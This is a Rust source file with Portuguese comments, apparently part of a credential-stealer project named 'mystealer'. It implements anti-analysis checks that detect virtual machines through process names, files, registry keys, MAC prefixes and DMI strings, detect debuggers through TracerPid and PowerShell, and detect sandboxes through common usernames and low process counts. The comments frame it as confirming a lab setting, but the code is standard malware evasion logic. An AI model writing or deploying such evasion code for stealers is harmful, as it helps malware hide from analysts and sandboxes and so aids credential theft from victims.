//! Verificações Anti-Análise
//!
//! Detecta ambientes de análise (VMs, debuggers, sandboxes).
//! No modo lab, usado para VERIFICAR que estamos em ambiente controlado.

use std::process::Command;
use tracing::{info, warn};

/// Verificador de ambiente
pub struct EnvironmentChecker;

impl EnvironmentChecker {
    /// Verifica se estamos em ambiente de laboratório (VM)
    /// Retorna true se o ambiente parece ser um lab controlado
    pub fn verify_lab_environment() -> Result<bool, String> {
        info!("Verificando ambiente de laboratório...");
        
        let mut is_lab = false;
        
        // Verificar se é VM (esperado para lab)
        if Self::is_virtual_machine() {
            info!("✅ Ambiente virtual detectado (esperado para lab)");
            is_lab = true;
        } else {
            warn!("⚠️ Não parece ser ambiente virtual");
        }
        
        // Verificar variáveis de ambiente de lab
        if std::env::var("MYSTEALER_LAB_MODE").is_ok() {
            info!("✅ Variável MYSTEALER_LAB_MODE encontrada");
            is_lab = true;
        }
        
        // Verificar arquivo de marcador
        if std::path::Path::new("/tmp/.mystealer_lab").exists() 
            || std::path::Path::new("C:\\Temp\\.mystealer_lab").exists() 
        {
            info!("✅ Arquivo marcador de lab encontrado");
            is_lab = true;
        }
        
        Ok(is_lab)
    }
    
    /// Detecta se está rodando em máquina virtual
    pub fn is_virtual_machine() -> bool {
        Self::check_vm_processes() ||
        Self::check_vm_files() ||
        Self::check_vm_registry() ||
        Self::check_vm_hardware()
    }
    
    /// Verifica processos de VM
    fn check_vm_processes() -> bool {
        let vm_processes = [
            "vmtoolsd", "vmwaretray", "vmwareuser",
            "VBoxService", "VBoxTray", "VBoxClient",
            "qemu-ga", "spice-vdagent",
            "xe-daemon", // Xen
        ];
        
        #[cfg(unix)]
        {
            if let Ok(output) = Command::new("ps").args(["aux"]).output() {
                let ps_output = String::from_utf8_lossy(&output.stdout).to_lowercase();
                for proc in vm_processes {
                    if ps_output.contains(&proc.to_lowercase()) {
                        info!("Processo VM detectado: {}", proc);
                        return true;
                    }
                }
            }
        }
        
        #[cfg(windows)]
        {
            if let Ok(output) = Command::new("tasklist").output() {
                let tasklist = String::from_utf8_lossy(&output.stdout).to_lowercase();
                for proc in vm_processes {
                    if tasklist.contains(&proc.to_lowercase()) {
                        info!("Processo VM detectado: {}", proc);
                        return true;
                    }
                }
            }
        }
        
        false
    }
    
    /// Verifica arquivos indicativos de VM
    fn check_vm_files() -> bool {
        let vm_files = [
            // VMware
            "/usr/bin/vmware-toolbox-cmd",
            "/usr/bin/vmtoolsd",
            // VirtualBox
            "/usr/bin/VBoxControl",
            "/usr/bin/VBoxClient",
            // QEMU
            "/usr/bin/qemu-ga",
            // Genérico
            "/sys/class/dmi/id/product_name",
        ];
        
        for file in vm_files {
            if std::path::Path::new(file).exists() {
                info!("Arquivo VM detectado: {}", file);
                return true;
            }
        }
        
        // Verificar conteúdo de DMI
        if let Ok(product) = std::fs::read_to_string("/sys/class/dmi/id/product_name") {
            let product_lower = product.to_lowercase();
            if product_lower.contains("virtual") 
                || product_lower.contains("vmware")
                || product_lower.contains("virtualbox")
                || product_lower.contains("qemu")
                || product_lower.contains("kvm")
            {
                info!("DMI indica VM: {}", product.trim());
                return true;
            }
        }
        
        false
    }
    
    /// Verifica registro do Windows para VMs
    #[cfg(windows)]
    fn check_vm_registry() -> bool {
        let vm_keys = [
            r"SOFTWARE\VMware, Inc.\VMware Tools",
            r"SOFTWARE\Oracle\VirtualBox Guest Additions",
            r"SYSTEM\CurrentControlSet\Services\VBoxGuest",
        ];
        
        for key in vm_keys {
            if let Ok(output) = Command::new("reg")
                .args(["query", &format!(r"HKEY_LOCAL_MACHINE\{}", key)])
                .output() 
            {
                if output.status.success() {
                    info!("Chave de registro VM detectada: {}", key);
                    return true;
                }
            }
        }
        
        false
    }
    
    #[cfg(not(windows))]
    fn check_vm_registry() -> bool {
        false
    }
    
    /// Verifica hardware de VM
    fn check_vm_hardware() -> bool {
        // Verificar MAC address
        #[cfg(unix)]
        {
            if let Ok(output) = Command::new("ip").args(["link"]).output() {
                let output_str = String::from_utf8_lossy(&output.stdout).to_lowercase();
                
                // MACs conhecidos de VMs
                let vm_macs = [
                    "00:0c:29", // VMware
                    "00:50:56", // VMware
                    "08:00:27", // VirtualBox
                    "52:54:00", // QEMU/KVM
                    "00:16:3e", // Xen
                ];
                
                for mac in vm_macs {
                    if output_str.contains(mac) {
                        info!("MAC de VM detectado: {}", mac);
                        return true;
                    }
                }
            }
        }
        
        false
    }
    
    /// Detecta presença de debugger
    pub fn is_debugger_present() -> bool {
        #[cfg(unix)]
        {
            // Verificar /proc/self/status para TracerPid
            if let Ok(status) = std::fs::read_to_string("/proc/self/status") {
                for line in status.lines() {
                    if line.starts_with("TracerPid:") {
                        if let Some(pid) = line.split_whitespace().nth(1) {
                            if pid != "0" {
                                info!("Debugger detectado (TracerPid: {})", pid);
                                return true;
                            }
                        }
                    }
                }
            }
        }
        
        #[cfg(windows)]
        {
            // Usar IsDebuggerPresent via comando
            if let Ok(output) = Command::new("powershell")
                .args(["-Command", "[System.Diagnostics.Debugger]::IsAttached"])
                .output() 
            {
                let result = String::from_utf8_lossy(&output.stdout);
                if result.trim().to_lowercase() == "true" {
                    info!("Debugger detectado via PowerShell");
                    return true;
                }
            }
        }
        
        false
    }
    
    /// Detecta ambiente de sandbox
    pub fn is_sandbox() -> bool {
        // Verificar usernames típicos de sandbox
        let sandbox_users = [
            "sandbox", "malware", "virus", "sample",
            "test", "john", "user", "currentuser", "admin",
        ];
        
        let username = whoami::username().to_lowercase();
        if sandbox_users.contains(&username.as_str()) {
            info!("Username típico de sandbox: {}", username);
            return true;
        }
        
        // Verificar poucos processos (típico de sandbox)
        #[cfg(unix)]
        {
            if let Ok(output) = Command::new("ps").args(["aux"]).output() {
                let count = String::from_utf8_lossy(&output.stdout).lines().count();
                if count < 30 {
                    info!("Poucos processos detectados: {} (típico de sandbox)", count);
                    return true;
                }
            }
        }
        
        false
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_environment_check() {
        // Este teste vai variar dependendo do ambiente
        let result = EnvironmentChecker::verify_lab_environment();
        assert!(result.is_ok());
    }
}

